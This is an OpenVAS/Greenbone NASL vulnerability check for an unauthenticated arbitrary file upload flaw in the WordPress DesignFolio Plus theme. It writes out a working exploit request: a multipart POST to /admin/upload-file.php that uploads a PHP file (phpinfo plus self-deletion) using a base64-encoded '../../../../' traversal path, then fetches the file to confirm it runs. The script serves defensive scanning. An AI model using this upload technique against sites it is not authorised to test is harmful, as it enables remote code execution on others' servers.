CPE = "cpe:/a:upthemes:designfolio-plus";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805156" );
	script_version( "2020-09-10T07:36:23+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-09-10 07:36:23 +0000 (Thu, 10 Sep 2020)" );
	script_tag( name: "creation_date", value: "2015-03-18 14:31:11 +0530 (Wed, 18 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "WordPress DesignFolio Plus Theme Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wordpress_theme_http_detect.sc" );
	script_mandatory_keys( "wordpress/theme/designfolio-plus/detected" );
	script_tag( name: "summary", value: "The WordPress DesignFolio Plus Theme is prone to an arbitrary file upload vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request
  and checks whether it is able to upload a file or not." );
	script_tag( name: "insight", value: "The flaw is due to the plugin failing to
  restrict access to certain files." );
	script_tag( name: "impact", value: "Successful exploitation will allow an
  unauthenticated remote attacker to upload arbitrary files." );
	script_tag( name: "affected", value: "WordPress DesignFolio Plus Theme through version 1.2." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36372" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
url = dir + "/admin/upload-file.php";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
	vtstrings = get_vt_strings();
	useragent = http_get_user_agent();
	index = eregmatch( pattern: "Undefined index: ([0-9a-z]+) in", string: res );
	fileName = vtstrings["lowercase_rand"] + ".php";
	postData = NASLString( "------------7nLRJ4OOOKgWZky9bsIqMS\r\n", "Content-Disposition: form-data; name=\"", index[1], "\"; filename=\"", fileName, "\"\r\n", "Content-Type: application/octet-stream\r\n\r\n", "<?php phpinfo(); unlink( \"", fileName, "\" ); ?>\r\n\r\n", "------------7nLRJ4OOOKgWZky9bsIqMS\r\n", "Content-Disposition: form-data; name=\"upload_path\"\r\n\r\n", "Li4vLi4vLi4vLi4v\r\n", "------------7nLRJ4OOOKgWZky9bsIqMS--" );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "Content-Type: multipart/form-data; boundary=----------7nLRJ4OOOKgWZky9bsIqMS\\r\\n\\r\\n", postData, "\\r\\n" );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "success" ) && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		url = dir + "/" + fileName;
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: ">phpinfo\\(\\)<", extra_check: ">System" )){
			if(http_vuln_check( port: port, url: url, check_header: FALSE, pattern: "^HTTP/1\\.[01] 200" )){
				report = "\\nUnable to delete the uploaded file at " + url + "\\n";
			}
			if( report ){
				security_message( data: report, port: port );
			}
			else {
				security_message( port: port );
			}
			exit( 0 );
		}
	}
}

